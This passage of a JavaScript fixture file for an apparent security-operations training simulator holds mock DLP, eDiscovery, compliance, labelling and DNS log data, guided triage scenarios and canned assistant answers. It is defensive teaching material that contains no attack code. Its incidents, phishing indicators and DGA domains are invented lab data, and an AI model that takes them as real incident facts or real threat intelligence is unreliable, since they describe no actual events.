    summary:'User attempted to share financial data externally after DLP block.',
    evidence:['DLP incident DLP-1007','Multiple external share attempts','Audit event FileDownloaded'],
    nextSteps:['Validate business need','Keep DLP block','Monitor for recurrence'] },
];

const COMMUNICATION_REVIEWS = [
  { id:'CC-3301', policy:'Regulated financial communications', severity:'medium',
    user:'trader1@hacksmarterlabs.example', channel:'Teams', status:'Pending reviewer',
    detected:'Potential promise of guaranteed return', message:'The client will get a guaranteed return if they sign today.' },
  { id:'CC-3308', policy:'Code of conduct', severity:'low',
    user:'sales.rep@hacksmarterlabs.example', channel:'Exchange', status:'Resolved',
    detected:'Potential harassment keyword', message:'Message held for context review and resolved as false positive.' },
];

const EDISCOVERY_CASES = [
  { id:'ED-9004', name:'Departing user data leak review', status:'Active',
    custodians:['olivia.martin@hacksmarterlabs.example'], sources:['Exchange mailbox','OneDrive','Teams chats'],
    holds:['Mailbox hold','OneDrive hold'], searches:['SharePoint finance downloads','USB copy events'],
    linkedCase:'IR-2044' },
  { id:'ED-9011', name:'OAuth consent abuse legal hold', status:'Draft',
    custodians:['jane.doe@hacksmarterlabs.example'], sources:['Exchange mailbox','Audit logs'],
    holds:['Mailbox hold pending'], searches:['DocViewer Pro consent and mail access'],
    linkedCase:'INC-1042' },
];

const EDISCOVERY_CONTENT_SEARCH = {
  caseId:'ED-9011',
  name:'DocViewer Pro consent and mail access',
  query:'("DocViewer Pro" OR "secure-document-portal") AND received>=2026-06-28',
  locations:['Jane Doe mailbox','Jane Doe OneDrive','Teams chats for Finance Ops'],
  conditions:['Date range: Jun 28, 2026 08:00-12:00 UTC','Sender or content contains secure-document-portal','Attachment names include invoice or overdue'],
  preview:[
    { location:'Exchange mailbox', item:'Action required: invoice overdue', custodian:'jane.doe@hacksmarterlabs.example',
      date:'2026-06-28T08:09:00Z', kind:'Email', match:'secure-document-portal[.]xyz link in message body' },
    { location:'Exchange mailbox', item:'DocViewer Pro permissions granted', custodian:'jane.doe@hacksmarterlabs.example',
      date:'2026-06-28T08:24:00Z', kind:'Notification', match:'OAuth app consent notification' },
    { location:'OneDrive', item:'Invoice-June-Overdue.url', custodian:'jane.doe@hacksmarterlabs.example',
      date:'2026-06-28T08:27:00Z', kind:'Shortcut', match:'Downloaded URL shortcut from phishing workflow' },
  ],
  export:['Export report only for triage notes','Export indexed items with deduplicated copies','Preserve export key in case notes; do not place real secrets in lab files'],
  interpretation:'Use Content search when the analyst needs mailbox, OneDrive, or Teams evidence for an investigation. Use Purview Audit for activity metadata and Graph activity logs for API calls.'
};

const GRAPH_ACTIVITY_GUIDANCE = [
  { title:'Where it lives',
    detail:'Graph activity logs are collected through diagnostic settings, then queried from the configured Log Analytics workspace or routed into Sentinel.' },
  { title:'What it answers',
    detail:'Use the logs to see which app, user, operation, request URI, IP address, and result were observed after an OAuth consent or compromised-token event.' },
  { title:'How to enable in the lab story',
    detail:'Create a diagnostic setting for Graph activity logs, send it to the SOC workspace, then hunt the GraphActivityLogs fixture table below.' },
];

const RECORD_LABELS = [
  { name:'Finance records - 7 years', type:'Retention label', status:'Published',
    disposition:'Disposition review required', locations:'SharePoint finance sites' },
  { name:'Legal hold material', type:'Record label', status:'Published',
    disposition:'Do not delete while active case exists', locations:'Exchange, OneDrive' },
  { name:'Security logs - 1 year', type:'Retention policy', status:'Published',
    disposition:'Auto-delete after retention period', locations:'Audit and security log exports' },
];

const LIFECYCLE_POLICIES = [
  { name:'Inactive Teams cleanup', status:'Simulation', scope:'Teams',
    rule:'No owner activity for 180 days', action:'Notify owner, then archive' },
  { name:'OneDrive stale content review', status:'Active', scope:'OneDrive',
    rule:'No access for 365 days and unlabeled', action:'Move to review workflow' },
  { name:'Audit export lifecycle', status:'Active', scope:'Storage account',
    rule:'Security export older than 365 days', action:'Delete after approval' },
];

const PURVIEW_SOLUTIONS = [
  { area:'Core', name:'Classic governance portal', route:'#/purview/classic-governance',
    detail:'Launch the support-mode classic governance experience for catalog, data health insights, and workflow labs.' },
  { area:'Data Security', name:'Data Loss Prevention', route:'#/purview/dlp',
    detail:'Protect sensitive content across Exchange, SharePoint, OneDrive, Teams, and endpoints.' },
  { area:'Data Security', name:'Information Protection', route:'#/purview/information-protection',
    detail:'Create sensitivity labels, label policies, and automatic classification behavior.' },
  { area:'Risk & Compliance', name:'Insider Risk Management', route:'#/purview/insider-risk',
    detail:'Detect risky user activity and manage investigation cases.' },
  { area:'Risk & Compliance', name:'Communication Compliance', route:'#/purview/communication-compliance',
    detail:'Review policy matches in Teams, Exchange, and other communication channels.' },
  { area:'Risk & Compliance', name:'eDiscovery', route:'#/purview/ediscovery',
    detail:'Create cases, manage custodians, preserve content, and run searches.' },
  { area:'Data Governance', name:'Records Management', route:'#/purview/records',
    detail:'Publish retention and record labels and review disposition workflows.' },
  { area:'Data Governance', name:'Data Lifecycle Management', route:'#/purview/lifecycle',
    detail:'Manage aging content, inactive locations, and retention-driven cleanup.' },
  { area:'Core', name:'Audit', route:'#/purview/audit',
    detail:'Search 365 audit events by operation, user, workload, and IP address.' },
];

const CLASSIC_PURVIEW_FEATURES = [
  { name:'Data Catalog (classic)', route:'#/purview/classic-governance',
    detail:'Search and browse registered data assets, recent assets, owned assets, and glossary-linked metadata.' },
  { name:'Data Health Insights (classic)', route:'#/purview/classic-governance',
    detail:'Review catalog analytics such as sources, assets, glossary terms, ownership, and curation health.' },
  { name:'Purview Workflow (classic)', route:'#/purview/classic-governance',
    detail:'Model approval workflows for glossary changes, access requests, and governance review tasks.' },
];

const PURVIEW_CONNECTED_SOURCES = [
  { name:'365', status:'Connected', assets:186, icon:'M365' },
  { name:'Azure', status:'Connected', assets:94, icon:'AZ' },
  { name:'Amazon Web Services', status:'Ready to connect', assets:0, icon:'AWS' },
  { name:'Snowflake', status:'Ready to connect', assets:0, icon:'SN' },
  { name:'Other apps', status:'Ready to connect', assets:0, icon:'APP' },
];

const SENSITIVITY_LABELS = [
  { name:'Public', color:'#107c10', protection:'None' },
  { name:'General', color:'#0078d4', protection:'Header/Footer marking' },
  { name:'Confidential\\Engineering', color:'#ff8c00', protection:'Encryption (E3 keyset), watermark' },
  { name:'Highly confidential\\Legal', color:'#a4262c', protection:'Encryption, do-not-forward, expiration' },
];

const LABEL_POLICIES = [
  { name:'Default user labeling policy', status:'Published', users:'All users',
    labels:['Public','General','Confidential\\Engineering'], settings:['Require justification to lower classification','Recommend label when credit-card data is found'] },
  { name:'Legal restricted documents', status:'Published', users:'Legal department',
    labels:['Highly confidential\\Legal'], settings:['Apply encryption','Do not forward','Expire access after 30 days'] },
];

const LABEL_ACTIVITY = [
  { time:'2026-06-28T13:12:00Z', user:'maria.ross@hacksmarterlabs.example', file:'Q4-forecast.xlsx', label:'Confidential\\Engineering', action:'Applied automatically' },
  { time:'2026-06-28T12:43:00Z', user:'legal.ops@hacksmarterlabs.example', file:'Litigation-hold.docx', label:'Highly confidential\\Legal', action:'Applied manually' },
  { time:'2026-06-28T11:58:00Z', user:'jdoe@hacksmarterlabs.example', file:'customer-list.xlsx', label:'General', action:'Downgraded with justification' },
];

const GUIDED_SCENARIOS = [
  {
    id:'noisy-detection',
    name:'Tune a noisy detection',
    archetype:'Suppression rule drift',
    summary:'Follow the scanner.exe alerts from suppression success to post-update hash drift.',
    steps:[
      { route:'#/defender/home', target:'.guided-scenario-card',
        title:'Start from the shift dashboard',
        body:'Pick the noisy scanner scenario from the home view, then move into the alert queue where the suppression behavior is visible.' },
      { route:'#/defender/alerts', target:'.grid tbody tr:nth-child(3)',
        title:'Open the post-update alert',
        body:'The first two scanner.exe detections are suppressed. The post-update events still have the same file name, but the hash changed, so the AND rule no longer matches.',
        actionLabel:'Open alert A003', action:'openAlert:A003' },
      { route:'#/defender/alerts', target:'#panel-alert .callout.warn',
        title:'Inspect the rule evaluation',
        body:'The alert detail shows which condition failed. In real tuning work, this is where you decide whether a hash is too volatile for the rule.' },
      { route:'#/defender/suppression', target:'.callout',
        title:'Review the suppression design',
        body:'Use stable indicators when possible, such as signer or controlled install path. Avoid broad file-name-only suppression for attacker look-alikes.' },
    ],
  },
  {
    id:'multi-alert-incident',
    name:'Triage a multi-alert incident',
    archetype:'DCSync identity attack',
    summary:'Open a correlated incident, review entities, and follow the timeline.',
    steps:[
      { route:'#/defender/incidents', target:'.grid tbody tr:first-child',
        title:'Find the identity incident',
        body:'The incident queue groups related Defender for Identity alerts into a single investigation record.',
        actionLabel:'Open incident INC-1019', action:'openIncident:INC-1019' },
      { route:'#/defender/incidents', target:'#panel-incident .entity-chip',
        title:'Pivot through evidence',
        body:'Entities identify the service account, domain controller, and source IP that matter for containment and validation.' },
      { route:'#/sentinel/incidents', target:'.grid tbody tr:first-child',
        title:'Confirm Sentinel correlation',
        body:'The same incident pattern appears from the SIEM side, reinforcing queue triage across Defender XDR and Sentinel.' },
    ],
  },
  {
    id:'hunt-public-folder',
    name:'Hunt endpoint staging',
    archetype:'KQL threat hunting',
    summary:'Run the saved query that finds suspicious process execution from C:\\Users\\Public.',
    steps:[
      { route:'#/defender/hunting', target:'#kql',
        title:'Load the hunting query',
        body:'The query searches process execution from a common attacker staging path and excludes routine initiating processes.' },
      { route:'#/defender/hunting', target:'.kql-toolbar .btn-primary',
        title:'Run against fixtures',
        body:'Run the mock query to review endpoint rows, then promote the pattern to detection engineering in Sentinel analytics.' },
      { route:'#/sentinel/analytics', target:'.grid tbody tr:first-child',
        title:'Connect hunting to rules',
        body:'Scheduled analytics rules turn repeatable hunting logic into alerting with severity, frequency, and MITRE mapping.' },
    ],
  },
  {
    id:'audit-search',
    name:'Search the audit log',
    archetype:'M365 audit investigation',
    summary:'Use Purview audit events to validate who performed a sensitive operation.',
    steps:[
      { route:'#/purview/audit', target:'.card.card-body',
        title:'Set audit criteria',
        body:'Audit search narrows activity by operation, user, workload, and time window during an investigation.' },
      { route:'#/purview/audit', target:'.grid tbody tr:nth-child(2)',
        title:'Review privileged activity',
      body:'The result set includes role assignment, file access, consent grant, and identity replication events for cross-checking incident evidence.' },
    ],
  },
  {
    id:'copilot-handoff',
    name:'Copilot handoff',
    archetype:'Embedded to standalone',
    summary:'Jump from the Defender home guided scenario into the matching standalone Copilot session.',
    steps:[
      { route:'#/defender/home', target:'.guided-scenario-card',
        title:'Open the local Copilot session',
        body:'Use the guided scenario overlay to jump into the same transcript that the embedded topbar Copilot panel references.',
        actionLabel:'Open session cs-009', action:'openCopilotSession:cs-009' },
      { route:'#/copilot/session', target:'.copilot-session-detail',
        title:'Review the standalone transcript',
        body:'The session detail view keeps the transcript, pin board, and rerun controls in one place so you can study the same investigation outside the embedded panel.' },
    ],
  },
];

const COPILOT_PROMPTS = [
  { title:'Summarize incident INC-1019',
    answer:'Two Defender for Identity alerts indicate possible DCSync from svc-backup against DC01. Review service-account ownership, reset credentials, and validate replication permissions before closure.',
    sessionId:'cs-001' },
  { title:'Draft KQL for public-folder execution',
    answer:'Start with DeviceProcessEvents, filter FolderPath for C:\\Users\\Public, remove known installers, then project Timestamp, DeviceName, FileName, SHA256, and AccountName for triage.',
    sessionId:'cs-005' },
  { title:'Expand Jane Doe entities',
    answer:'Pivot from jane.doe@hacksmarterlabs.example to the phishing URL, OAuth app DocViewer Pro, sign-in IP 76.21.55.4, and recent CloudAppEvents consent activity.',
    sessionId:'cs-003' },
  { title:'Map this to MITRE',
    answer:'Scanner tuning maps to Discovery. DCSync maps to Credential Access and Persistence. OAuth abuse maps to Initial Access and Persistence. Ransomware posture work maps to Impact prevention.',
    sessionId:'cs-006' },
  { title:'Run guided investigation for INC-1042',
    answer:'Open the guided flow to review the static plan, tool calls, entity expansion, and final containment verdict for the phishing-to-OAuth incident.',
    flow:'agentic-investigation',
    sessionId:'cs-009' },
];

const DEFAULT_SUPPRESSION_RULE = {
  id:'R-DEFAULT', name:'Suppress legitimate vulnerability scanner',
  scope:'All devices in organization', createdAt:'2026-06-28T08:30:00Z', enabled:true,
  conditions:[
    { field:'file_name', op:'equals', value:'scanner.exe' },
    { field:'sha256',    op:'equals', value:KNOWN_GOOD_HASH },
  ],
};

const FIELDS = [
  { key:'file_name', label:'File name' },
  { key:'sha256',    label:'SHA256' },
  { key:'path',      label:'Folder path' },
  { key:'cmdline',   label:'Process command line' },
  { key:'signer',    label:'Signer' },
];

const PORTALS = [
  { id:'defender',      name:'XDR Security',       tag:'XDR · alerts, incidents, hunting',           color:'#0078d4', initial:'XDR' },
  { id:'sentinel',      name:'SIEM & SOAR',        tag:'SIEM · analytics rules, hunting, automation',color:'#0064bf', initial:'SIEM' },
  { id:'defender-cloud',name:'Cloud Console',      tag:'CSPM/CWPP · recommendations, compliance',    color:'#5c2d91', initial:'CC' },
  { id:'purview',       name:'Data Governance',    tag:'Data security · DLP, insider risk, audit',   color:'#038387', initial:'DG' },
  { id:'copilot',       name:'AI Security Agent',           tag:'Standalone · sessions, promptbooks, plugins, knowledge', color:'#7a7574', initial:'AI' },
  { id:'entra',         name:'Identity & Access',  tag:'Identity · Conditional Access, Identity Protection', color:'#0b5cab', initial:'IAM' },
  { id:'m365-admin',    name:'Workspace Admin',    tag:'Tenant admin · users, licenses, health, reports', color:'#7719aa', initial:'WA' },
];

// Neutral simulator app launcher. Shown in the outer pane across all workloads;
// the current app gets highlighted by the renderer.
const CLOUD_NAV = [
  { label:'AI Foundry',           icon:'🧠' },
  { label:'Cloud Console',        icon:'🔷' },
  { label:'AI Agent Studio',      icon:'🤖' },
  { label:'Data Explorer',       icon:'📊' },
  { label:'XDR Security',         icon:'🛡' },
  { label:'DevOps',              icon:'🛠' },
  { label:'Identity & Access',    icon:'🆔' },
  { label:'Data Fabric',          icon:'🧵' },
  { label:'Code Repository',      icon:'🗃' },
  { label:'Endpoint Management',  icon:'📱' },
  { label:'Workspace Admin',      icon:'🏢' },
  { label:'Workflow Automation',  icon:'🔁' },
  { label:'Low-Code Platform',    icon:'⚡' },
  { label:'Data Governance',      icon:'📚' },
  { label:'Code Studio',          icon:'🧩' },
  { label:'SIEM & SOAR',          icon:'🛰' },
];

const NAV = {
  defender: [
    { route:'#/defender/home',                  label:'Home',                    icon:'🏠' },
    { section:'Exposure management' },
    { route:'#/defender/exposure',              label:'Overview',                icon:'🎯' },
    { route:'#/defender/secure-score',          label:'Secure score',            icon:'🛡' },
    { route:'#/defender/vulnerabilities',       label:'Vulnerability management', icon:'🩹' },
    { section:'Investigation & response' },
    { subsection:'Incidents & alerts' },
    { route:'#/defender/incidents',             label:'Incidents',               icon:'⛓' },
    { route:'#/defender/alerts',                label:'Alerts',                  icon:'⚠' },
    { route:'#/defender/cases',                 label:'Cases',                   icon:'📁' },
    { route:'#/defender/alert-tuning',          label:'Alert tuning',            icon:'🎚' },
    { subsection:'Hunting' },
    { route:'#/defender/hunting',               label:'Advanced hunting',        icon:'🔎' },
    { route:'#/defender/custom-detections',     label:'Custom detection rules',  icon:'🧠' },
    { route:'#/defender/hunting-graph',         label:'Hunting graph (Preview)', icon:'🕸' },
    { subsection:'Actions & submissions' },
    { route:'#/defender/action-center',         label:'Action center',           icon:'🧰' },
    { route:'#/defender/air',                   label:'AIR center',              icon:'🤖' },
    { section:'Threat intelligence' },
    { route:'#/defender/threat-analytics',      label:'Threat analytics',        icon:'📊' },
    { route:'#/defender/intel-explorer',        label:'Intel explorer',          icon:'🛰' },
    { route:'#/sentinel/threat-intel',          label:'Intel management',        icon:'🗂' },
    { section:'Assets' },
    { route:'#/defender/devices',               label:'Devices',                 icon:'💻' },
    { route:'#/defender/identities',            label:'Identities',              icon:'🆔' },
    { route:'#/defender/identity-protection',   label:'Identity protection',     icon:'🔐' },
    { section:'Endpoints' },
    { route:'#/defender/endpoints',             label:'Endpoint security ops',   icon:'💻' },
    { route:'#/defender/asr-policy',            label:'ASR policies',            icon:'🚧' },
    { section:'Email & collaboration' },
    { route:'#/defender/email-collab',          label:'Email & collaboration',   icon:'✉' },
    { route:'#/defender/threat-explorer',       label:'Threat explorer',         icon:'📧' },
    { section:'Cloud apps' },
    { route:'#/defender/cloud-apps',            label:'Cloud apps',              icon:'☁' },
    { section:'SIEM & SOAR' },
    { route:'#/sentinel/home',                  label:'Overview',                icon:'🏠' },
    { route:'#/sentinel/search',                label:'Search',                  icon:'🔎' },
    { route:'#/sentinel/graph',                 label:'Sentinel Graph',          icon:'🕸' },
    { subsection:'Threat management' },
    { route:'#/sentinel/workbooks',             label:'Workbooks',               icon:'📓' },
    { route:'#/sentinel/hunting',               label:'Hunting',                 icon:'🔎' },
    { route:'#/sentinel/notebooks',             label:'Notebooks',               icon:'📔' },
    { route:'#/sentinel/mitre',                 label:'MITRE ATT&CK',            icon:'🧭' },
    { subsection:'Content management' },
    { route:'#/sentinel/content-hub',           label:'Content hub',             icon:'🧱' },
    { route:'#/sentinel/repositories',          label:'Repositories',            icon:'📚' },
    { route:'#/sentinel/community',             label:'Community',               icon:'💬' },
    { subsection:'Configuration' },
    { route:'#/sentinel/data-connectors',       label:'Data connectors',         icon:'🔌' },
    { route:'#/sentinel/analytics',             label:'Analytics',               icon:'🧠' },
    { route:'#/sentinel/watchlist',             label:'Watchlists',              icon:'👁' },
    { route:'#/sentinel/automation',            label:'Automation',              icon:'⚙' },
    { section:'Other' },
    { route:'#/defender/reports',               label:'Reports',                 icon:'📑' },
    { route:'#/defender/learning-hub',          label:'Learning hub',            icon:'🎓' },
    { route:'#/defender/trials',                label:'Trials',                  icon:'🧪' },
    { section:'System' },
    { route:'#/defender/settings',              label:'Settings',                icon:'⚙' },
    { route:'#/sentinel/settings',              label:'SIEM & SOAR',             icon:'🛰' },
    { route:'#/defender/device-discovery',      label:'Device discovery',        icon:'📡' },
    { route:'#/defender/suppression',           label:'Suppression rules',       icon:'🔕' },
    { route:'#/defender/notifications',         label:'Email notifications',     icon:'📨' },
    { route:'#/defender/mto',                   label:'Multi-tenant management', icon:'👥' },
    // === local-tasks nav:defender ===
  ],
  sentinel: [
    { section:'General' },
    { route:'#/sentinel/home',                  label:'Overview (Preview)',      icon:'🏠' },
    { route:'#/sentinel/logs',                  label:'Logs',                    icon:'📜' },
    { route:'#/sentinel/news',                  label:'News & guides',           icon:'📰' },
    { route:'#/sentinel/search',                label:'Search',                  icon:'🔎' },
    { section:'Threat management' },
    { route:'#/sentinel/incidents',             label:'Incidents',               icon:'⛓' },
    { route:'#/sentinel/graph',                 label:'Sentinel Graph',          icon:'🕸' },
    { route:'#/sentinel/workbooks',             label:'Workbooks',               icon:'📓' },
    { route:'#/sentinel/hunting',               label:'Hunting',                 icon:'🔎' },
    { route:'#/sentinel/hunting/dns',           label:'ASIM DNS (Preview)',      icon:'🌐' },
    { route:'#/sentinel/hunting/authentication', label:'ASIM Authentication (Preview)', icon:'🔐' },
    { route:'#/sentinel/hunting/network-session', label:'ASIM Network Session (Preview)', icon:'🛰' },
    { route:'#/sentinel/anomalies',             label:'Anomalies',               icon:'〽' },
    { route:'#/sentinel/soc-optimization',      label:'SOC optimization',        icon:'📈' },
    { route:'#/sentinel/summary-rules',         label:'Summary rules',           icon:'∑' },
    { route:'#/sentinel/data-lake-jobs',        label:'Data lake KQL jobs',      icon:'🌊' },
    { route:'#/sentinel/notebooks',             label:'Notebooks',               icon:'📓' },
    { route:'#/sentinel/entity-behavior',       label:'Entity behavior',         icon:'👤' },
    { route:'#/sentinel/threat-intel',          label:'Threat intelligence',     icon:'🛰' },
    { route:'#/sentinel/mitre',                 label:'MITRE ATT&CK (Preview)',  icon:'🧭' },
    { section:'Content management' },
    { route:'#/sentinel/content-hub',           label:'Content hub',             icon:'🧱' },
    { route:'#/sentinel/repositories',          label:'Repositories (Preview)',  icon:'📚' },
    { route:'#/sentinel/community',             label:'Community',               icon:'💬' },
    { section:'Configuration' },
    { route:'#/sentinel/workspace-manager',     label:'Workspace manager (Preview)', icon:'🧰' },
    { route:'#/sentinel/data-connectors',       label:'Data connectors',         icon:'🔌' },
    { route:'#/sentinel/analytics',             label:'Analytics',               icon:'🧠' },
    { route:'#/sentinel/watchlist',             label:'Watchlist',               icon:'👁' },
    { route:'#/sentinel/automation',            label:'Automation',              icon:'⚙' },
    { route:'#/sentinel/settings',              label:'Settings',                icon:'⚙' },
    // === local-tasks nav:sentinel ===
  ],
  'defender-cloud': [
    { section:'General' },
    { route:'#/defender-cloud/overview',         label:'Overview',                   icon:'🏠' },
    { route:'#/defender-cloud/setup',            label:'Setup',                      icon:'🧩' },
    { route:'#/defender-cloud/recommendations',  label:'Recommendations',            icon:'✅' },
    { route:'#/defender-cloud/attack-paths',     label:'Attack path analysis',       icon:'🧭' },
    { route:'#/defender-cloud/alerts',           label:'Security alerts',            icon:'⚠' },
    { route:'#/defender-cloud/inventory',        label:'Inventory',                  icon:'📦' },
    { route:'#/defender-cloud/explorer',         label:'Cloud Security Explorer',    icon:'🔎' },
    { route:'#/defender-cloud/workbooks',        label:'Workbooks',                  icon:'📓' },
    { route:'#/defender-cloud/community',        label:'Community',                  icon:'💬' },
    { route:'#/defender-cloud/diagnose',         label:'Diagnose and solve problems',icon:'🩺' },
    { section:'Cloud Security' },
    { route:'#/defender-cloud/cloud-security',   label:'Cloud Security',             icon:'☁' },
    { route:'#/defender-cloud/regulatory',       label:'Regulatory compliance',      icon:'📜' },
    { section:'Management' },
    { route:'#/defender-cloud/environment',      label:'Environment settings',       icon:'⚙' },
    { route:'#/defender-cloud/workflow',         label:'Workflow automation',        icon:'🔁' },
    // === local-tasks nav:defender-cloud ===
  ],
  purview: [
    { section:'Purview' },
    { route:'#/purview/home',                   label:'Home',                  icon:'🏠' },
    { route:'#/purview/solutions',              label:'Solutions',             icon:'🧩' },
    { route:'#/purview/classic-governance',     label:'Classic governance',    icon:'🏛' },
    { section:'Data security' },
    { route:'#/purview/dlp',                    label:'Data loss prevention',  icon:'🚫' },
    { route:'#/purview/information-protection', label:'Information protection',icon:'🔖' },
    { section:'Risk & compliance' },
    { route:'#/purview/insider-risk',           label:'Insider risk',          icon:'🕵' },
    { route:'#/purview/communication-compliance', label:'Communication compliance', icon:'💬' },
    { route:'#/purview/ediscovery',             label:'eDiscovery',            icon:'🔍' },
    { route:'#/purview/audit',                  label:'Audit',                 icon:'📜' },
    { route:'#/purview/graph-activity',         label:'Graph activity logs',   icon:'🧾' },
    { section:'Data governance' },
    { route:'#/purview/records',                label:'Records management',    icon:'🗃' },
    { route:'#/purview/lifecycle',              label:'Data lifecycle',        icon:'⏱' },
    { section:'Portal' },
    { route:'#/purview/settings',               label:'Settings',              icon:'⚙' },
    // === local-tasks nav:purview ===
  ],
  copilot: [
    { route:'#/copilot/home',                   label:'Home',                  icon:'🏠' },
    { route:'#/copilot/sessions',               label:'Sessions',              icon:'🗂' },
    { route:'#/copilot/promptbooks',            label:'Promptbooks',           icon:'📚' },
    { route:'#/copilot/plugins',                label:'Plugins',               icon:'🧩' },
    { route:'#/copilot/knowledge',              label:'Knowledge',             icon:'🧠' },
    { route:'#/copilot/settings',               label:'Settings',              icon:'⚙' },
    // === local-tasks nav:copilot ===
  ],
  entra: [
    { section:'Identity' },
    { route:'#/entra/overview',                 label:'Overview',              icon:'🏠' },
    { section:'Protection' },
    { route:'#/entra/identity-protection',      label:'Identity Protection',  icon:'🛡' },
    { route:'#/entra/conditional-access',       label:'Conditional Access',   icon:'🔐' },
    // Sign-in logs belong to monitoring, not to the identity object list — the
    // real console puts them at Identity > Monitoring & health > Sign-in logs.
    // A student who learns the wrong path here has to unlearn it later.
    { section:'Monitoring & health' },
    { route:'#/entra/sign-in-logs',             label:'Sign-in logs',          icon:'🔑' },
    // === local-tasks nav:entra ===
  ],
  'm365-admin': [
    { route:'#/m365-admin/home',                label:'Home',                  icon:'🏠' },
    { section:'Your organization' },
    { route:'#/m365-admin/users',               label:'Users',                 icon:'👥' },
    { route:'#/m365-admin/licenses',            label:'Billing › Licenses',    icon:'🪪' },
    { section:'Reports' },
    { route:'#/m365-admin/usage',               label:'Usage',                 icon:'📊' },
    { section:'Health' },
    { route:'#/m365-admin/service-health',      label:'Service health',        icon:'💚' },
    { route:'#/m365-admin/message-center',      label:'Message center',        icon:'📣' },
    { section:'Configuration' },
    { route:'#/m365-admin/setup',               label:'Setup',                 icon:'🧩' },
    { route:'#/m365-admin/admin-centers',       label:'Admin centers',         icon:'🧭' },
  ],
};

// Seed Conditional Access policies shown in the Entra > Conditional Access list.
const ENTRA_CA_POLICIES = [
  { name:'CA001 - Require MFA for admins',       assignment:'Directory roles: 9 admin roles', conditions:'—',                              grant:'Require multifactor authentication', state:'On' },
  { name:'CA002 - Block legacy authentication',  assignment:'All users',                      conditions:'Client apps: legacy',            grant:'Block access',                        state:'On' },
];

// Grant controls offered in the Conditional Access policy builder.
const ENTRA_CA_GRANTS = [
  { id:'block',     label:'Block access' },
  { id:'mfa',       label:'Require multifactor authentication' },
  { id:'pwd',       label:'Require password change' },
  { id:'compliant', label:'Require device to be marked compliant' },
];

// ---------- ASIM DNS hunting (Sentinel) ----------
// Source: ASIM DNS schema reference. _Im_Dns is the unifying parser; here we
// fake a small bundled dataset so the lab can demonstrate the query shape
// (filter params, NXDOMAIN beacons, TOR proxy lookups, suspicious response
// prefixes, ANY-type recon, DNS tunneling).
const IM_DNS = [
  // Baseline benign traffic from corporate clients.
  { TimeGenerated:'2026-06-29T07:55:01Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.12', SrcHostname:'WKS-01', DstIpAddr:'10.0.0.10', DnsQuery:'github.com',
    DnsQueryTypeName:'A', DnsResponseName:'140.82.114.4' },
  { TimeGenerated:'2026-06-29T07:55:14Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.31', SrcHostname:'WKS-12', DstIpAddr:'10.0.0.10', DnsQuery:'login.identity.example',
    DnsQueryTypeName:'A', DnsResponseName:'20.190.137.40' },
  { TimeGenerated:'2026-06-29T07:56:02Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.31', SrcHostname:'WKS-12', DstIpAddr:'10.0.0.10', DnsQuery:'outlook.office365.com',
    DnsQueryTypeName:'A', DnsResponseName:'52.96.79.18' },
  { TimeGenerated:'2026-06-29T07:57:11Z', EventProduct:'Corelight Zeek', EventVendor:'Corelight', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.55', SrcHostname:'WKS-21', DstIpAddr:'10.0.0.10', DnsQuery:'raw.githubusercontent.com',
    DnsQueryTypeName:'A', DnsResponseName:'185.199.108.133' },
  { TimeGenerated:'2026-06-29T07:58:30Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.12', SrcHostname:'WKS-01', DstIpAddr:'10.0.0.10', DnsQuery:'docs.security.example',
    DnsQueryTypeName:'A', DnsResponseName:'13.107.42.16' },
  { TimeGenerated:'2026-06-29T08:00:00Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
    SrcIpAddr:'10.0.4.41', SrcHostname:'WKS-17', DstIpAddr:'10.0.0.10', DnsQuery:'cdn.jsdelivr.net',
    DnsQueryTypeName:'A', DnsResponseName:'151.101.1.229' },

  // NXDOMAIN DGA burst from FIN-03 — tight time window, random labels.
  { TimeGenerated:'2026-06-29T08:02:01Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
    SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10', DnsQuery:'xk93lv2-mzpq.top',
    DnsQueryTypeName:'A', DnsResponseName:'' },
  { TimeGenerated:'2026-06-29T08:02:04Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
    SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10', DnsQuery:'jq8z7nx-rmav.top',
    DnsQueryTypeName:'A', DnsResponseName:'' },
  { TimeGenerated:'2026-06-29T08:02:07Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
    SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10', DnsQuery:'lzpq3rk-x4mq.top',
    DnsQueryTypeName:'A', DnsResponseName:'' },
  { TimeGenerated:'2026-06-29T08:02:09Z', EventProduct:'Hack Smarter Labs DNS Server', EventVendor:'Hack Smarter Labs', EventSchema:'Dns',
    EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
    SrcIpAddr:'10.0.4.77', SrcHostname:'WKS-FIN-03', DstIpAddr:'10.0.0.10', DnsQuery:'pq3rkmz-9xq2.top',
    DnsQueryTypeName:'A', DnsResponseName:'' },
